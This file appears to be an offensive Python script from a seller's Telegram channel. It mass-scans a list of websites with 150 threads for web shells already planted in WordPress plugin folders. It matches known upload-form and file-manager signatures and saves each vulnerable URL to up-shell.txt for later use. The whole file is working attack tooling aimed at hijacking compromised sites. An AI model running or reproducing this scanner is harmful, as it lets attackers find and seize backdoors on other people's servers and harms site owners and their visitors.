import sys , requests, re, random, string
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 
init(autoreset=True)
fr  =   Fore.RED
fg  =   Fore.GREEN

banner = '''{}
		   
[#] Create By ::
	  ___                                                    ______        
>=>      >=>           >======>         >===>          >===>      >===>>=====> 
 >=>   >=>   >====>>=> >=>    >=>     >=>    >=>     >=>    >=>        >=>     
  >=> >=>         >=>  >=>    >=>   >=>        >=> >=>        >=>      >=>     
    >=>          >=>   >> >==>      >=>        >=> >=>        >=>      >=>     
  >=> >=>       >=>    >=>  >=>     >=>        >=> >=>        >=>      >=>     
 >=>   >=>      >=>    >=>    >=>     >=>     >=>    >=>     >=>       >=>     
>=>      >=>    >=>    >=>      >=>     >===>          >===>           >=>     
          ############## perv  ##############                                                                     		 
	    Telegram Channels => https://t.me/x7seller					   
\n'''.format(fr)
print banner
requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def ran(length):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))

Pathlist = ['/wp-content/plugins/helloapx/wp-apxupx.php?apx=upx', '/wp-content/plugins/dhon/newsfeed.php', '/wp-content/plugins/wpcall-button/button-image.php', '/wp-content/plugins/Core-Econ/upH.php', '/wp-content/plugins/phpadmin/acp.php', '/wp-content/plugins/phpad/acp.php']

class EvaiLCode:
	def __init__(self):

		self.headers = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}

	
	def URLdomain(self, site):

		if site.startswith("http://") :
			site = site.replace("http://","")
		elif site.startswith("https://") :
			site = site.replace("https://","")
		else :
			pass
		pattern = re.compile('(.*)/')
		while re.findall(pattern,site):
			sitez = re.findall(pattern,site)
			site = sitez[0]
		return site
		
		
	def checker(self, site):
		try:
			
			url = "http://" + self.URLdomain(site)
			for Path in Pathlist:
				check = requests.get(url + Path, headers=self.headers, verify=False, timeout=25).content
				if("-rw-r--r--" in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('up-shell.txt','a').write(url + Path + "\n")
					break
				elif('input type="file" name="file"><input name="_upl" type="submit" id="_upl" value="Upload"' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('up-shell.txt','a').write(url + Path + "\n")
					break
				elif("input type='file' name='zb'><input type='submit' name='upload' value='upload'" in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('up-shell.txt','a').write(url + Path + "\n")
					break
				elif('input type="file" name="apx"><input type="submit"' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('up-shell.txt','a').write(url + Path + "\n")
					break
				elif('Tiny File Manager' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('up-shell.txt','a').write(url + Path + "\n")
					break
				elif('input type="submit" value="Upload Image" name="submit"' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('up-shell.txt','a').write(url + Path + "\n")
					break
				else:
					print('Target:{} -->! {}[Failid]').format(url, fr)
					
		except:
			pass



	
Control = EvaiLCode()	
def RunUploader(site):
	try:
		Control.checker(site)
	except:
		pass
mp = Pool(150)
mp.map(RunUploader, target)
mp.close()
mp.join()